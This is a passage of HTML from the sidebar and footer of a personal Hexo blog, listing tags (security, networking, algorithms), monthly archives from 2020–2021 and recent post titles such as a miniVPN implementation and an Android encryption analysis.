href="/project/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E9%80%86%E5%90%91/">逆向</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/CV/" rel="tag">CV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/STL/" rel="tag">STL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/adversarial-patch/" rel="tag">adversarial patch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/db/" rel="tag">db</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/encryption/" rel="tag">encryption</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/gdb/" rel="tag">gdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/vpn/" rel="tag">vpn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%95%A3%E5%88%97/" rel="tag">散列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%92%E5%BD%92/" rel="tag">递归</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/project/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/project/tags/C/" style="font-size: 10px;">C++</a> <a href="/project/tags/CV/" style="font-size: 10px;">CV</a> <a href="/project/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/project/tags/Git/" style="font-size: 10px;">Git</a> <a href="/project/tags/STL/" style="font-size: 10px;">STL</a> <a href="/project/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/project/tags/adversarial-patch/" style="font-size: 10px;">adversarial patch</a> <a href="/project/tags/android/" style="font-size: 10px;">android</a> <a href="/project/tags/blog/" style="font-size: 20px;">blog</a> <a href="/project/tags/db/" style="font-size: 10px;">db</a> <a href="/project/tags/dp/" style="font-size: 10px;">dp</a> <a href="/project/tags/encryption/" style="font-size: 10px;">encryption</a> <a href="/project/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/project/tags/linux/" style="font-size: 10px;">linux</a> <a href="/project/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/project/tags/scapy/" style="font-size: 10px;">scapy</a> <a href="/project/tags/vpn/" style="font-size: 10px;">vpn</a> <a href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" style="font-size: 15px;">中国象棋</a> <a href="/project/tags/%E5%88%B7%E9%A2%98/" style="font-size: 10px;">刷题</a> <a href="/project/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 10px;">排序</a> <a href="/project/tags/%E6%95%A3%E5%88%97/" style="font-size: 10px;">散列</a> <a href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/project/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 10px;">虚拟机</a> <a href="/project/tags/%E9%80%86%E5%90%91/" style="font-size: 10px;">逆向</a> <a href="/project/tags/%E9%80%92%E5%BD%92/" style="font-size: 10px;">递归</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/project/2021/07/16/tmp/">(no title)</a>
          </li>
        
          <li>
            <a href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/">hexo使用</a>
          </li>
        
          <li>
            <a href="/project/2021/05/19/vpn/">miniVPN实现</a>
          </li>
        
          <li>
            <a href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/">安卓程序加密算法及密钥生成过程分析</a>
          </li>
        
          <li>
            <a href="/project/2021/05/17/ECCV2020/">Bias-based Universal Adversarial Patch Attack for Automatic Check-out</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Imane<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/project/" class="mobile-nav-link">Home</a>
  
    <a href="/project/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/project/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/project/tags" class="mobile-nav-link">Tags</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css">

  
<script src="/project/fancybox/jquery.fancybox.pack.js"></script>




<script src="/project/js/script.js"></script>




  </div>
</body>
</html>